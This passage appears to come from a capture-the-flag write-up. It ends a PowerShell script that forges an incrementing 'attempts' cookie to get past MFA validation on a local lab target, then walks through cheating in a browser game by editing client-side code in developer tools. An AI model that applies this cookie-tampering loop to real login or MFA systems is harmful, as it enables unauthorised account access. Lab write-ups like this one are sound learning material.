                    $counterPart++
                    $formattedCounter = "{0:D2}" -f $counterPart
                    $newAttemptsCookieValue = "$base64Part$formattedCounter"
                    $session.Cookies.Add((New-Object System.Net.Cookie("attempts", $newAttemptsCookieValue, "/", "127.0.0.1")))

                    try {
                        $responseFake = Invoke-WebRequest -Uri $mfaValidationUrl -WebSession $session -Credential $adminCredentials -AllowUnencryptedAuthentication -ErrorAction Stop
                        Write-Host "Request #${i} sent with attempts cookie: $newAttemptsCookieValue"

                        # Log response headers and body for each request
                        Write-Host "Response Headers for Request #${i}:"
                        $responseFake.Headers
                        Write-Host "Response Body for Request #${i}:"
                        $responseFake.Content

                        # Check for success on 11th attempt
                        if ($i -eq 11 -and $responseFake.StatusCode -eq 200) {
                            Write-Host "Access granted on attempt #11!"
                        }
                    } catch {
                        Write-Host "Error during request #${i}: $($_)"
                    }
                }
            } else {
                Write-Warning "No MFA token found for token ${token}"
            }
        } catch {
            Write-Warning "Failed to process token ${token}: $($_)"
        }
    }
}

Answer

Access granted on attempt #11!

This challenge is a browser game, with the challenge being to making "client-side" changes to hack the game. Once again, a new concept for me. Luckily, this challenge was well designed for collaboration, requiring two players to be in a match together by default. I was able to engage with more experienced players through Discord to help me understand more of the tools I needed to use for this challenge.

Browser issues

While I tend not to use Chrome or Chrome derivatives for daily browsing, Firefox was not as helpful in this challenge. Based on the recommendations of others, I completed the game with it in Chromium instead of Firefox.

Once the game is open in your browser of choice, open the developer tools by right click with a mouse and select Inspect or F12 depending on your browser. I went back and forth between Chromium in my Kali VM and Chromium on my daily driver due to tooling issues.

1.Select 'Sources'; 2. Select 'Overrides'

This challenge was great for learning more about client side actions. I started by downloading the sources. This may be helpful for inspecting the code with a familiar tool like VS Code, but it doesn't help towards completing the challenge. Instead, stay within dev tools and from the Overrides tab select 'Enable Local Overrides'.

Enable Local Overrides and select a working folder to save local changes

If you beat the game without any change to the code, which includes being the teammate of someone who beats Wombley with cheating, you will get the bronze achievement.

Beat the game without cheating

Once you have a working folder selected for local overrides to save to, you can go back to 'Page', double-click where you want to make changes and start modifying the code. Press Ctrl+s, then F5 or reload the page to implement the changes.

Use double forward slash (//) to comment out a line

When you read through the source code, there will be a number of changes that can be made. Some will affect your rate of 'fire' like line 26 and some will change the environment like line 56 above. There is, however, a specific hack that needs to be completed in order to obtain Silver or Gold for this challenge.

Changing throwspeed to '0' creates a "Rapid Fire" effect

To complete Silver, remove the Ice Wall from the environment by commenting out line 56, line 1751 & 1752.

Use the search or Ctrl+f to find ice_wall and comment out the lines

Remember to save the changes and reload the page

Now Wombley has no where to hide!!!

Finish the job

While removing the ice wall is handy for beating Wombley easier, that alone will not trigger the Silver badge. Be sure you walk through the space that the ice wall should be in to trigger the hacker message and achieve the Silver badge.

If you are working with a partner on this challenge this is a good example of the client side changes. Your local copy of the game no longer has the ice wall, but if you are playing with someone else who has not removed the ice wall, they will see your pixie walking through the wall while they will be unable to follow or fire where you do. Same for the rate of fire, though with the number of snowballs flying around, this may not be as noticiable. There are other aspects of the game that you can try commenting out or restoring to change aspects of the game play and they will only apply to you as well. Depending on what is changed, another player may not even see the changes that you have made.
